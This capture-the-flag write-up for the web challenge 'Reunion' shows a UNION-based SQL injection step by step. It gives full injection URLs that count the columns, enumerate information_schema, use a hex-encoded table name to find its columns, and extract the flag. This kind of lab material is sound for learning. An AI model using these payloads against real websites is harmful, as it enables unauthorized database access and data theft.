---
layout: writeup
title: 'Reunion'
level:
difficulty:
points: 150
categories: [web]
tags: []
flag: abctf{uni0n_1s_4_gr34t_c0mm4nd}
---
**Challenge**
SQL injection challenge, great resource for union based sql injection
[here][1]

## Solution

first we find out how many columns there are by simply guessing and
seeing when we get an output:

    http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5 from information_schema.tables where table_schema=database()--+
    no results
    http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42 from information_schema.tables where table_schema=database()--+
    no results
    http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42,134 from information_schema.tables where table_schema=database()--+
    no results
    http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42,134,8 from information_schema.tables where table_schema=database()--+
    Name: Saranac
    Breed: Great Dane
    Color: Black
    Name: 42
    Breed: 5
    Color: 134

bingo!

next we find out the table name

    http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42,table_name,8 from information_schema.tables where table_schema=database()--+

    Name: Saranac
    Breed: Great Dane
    Color: Black
    Name: 42
    Breed: 5
    Color: w0w_y0u_f0und_m3
    Name: 42
    Breed: 5
    Color: webeight

so we know the table\_name is `w0w_y0u_f0und_m3`

now for the column names (we had to hex encode the table name for this
to work):

    http://yrmyzscnvh.abctf.xyz/web8/?id=2 union select 2,2,column_name,8 from information_schema.columns where table_schema=database() and table_name=0x7730775f7930755f6630756e645f6d33--+
    Name: Doodle
    Breed: Poodle
    Color: Pink
    Name: 2
    Breed: 2
    Color: f0und_m3
    '''

    So we found the column name we need. now to extract data from this column

    http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 2,4,f0und_m3,1 from w0w_y0u_f0und_m3--+
    Name: Saranac
    Breed: Great Dane
    Color: Black
    Name: 4
    Breed: 2
    Color: abctf{uni0n_1s_4_gr34t_c0mm4nd}



[1]: http://securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html
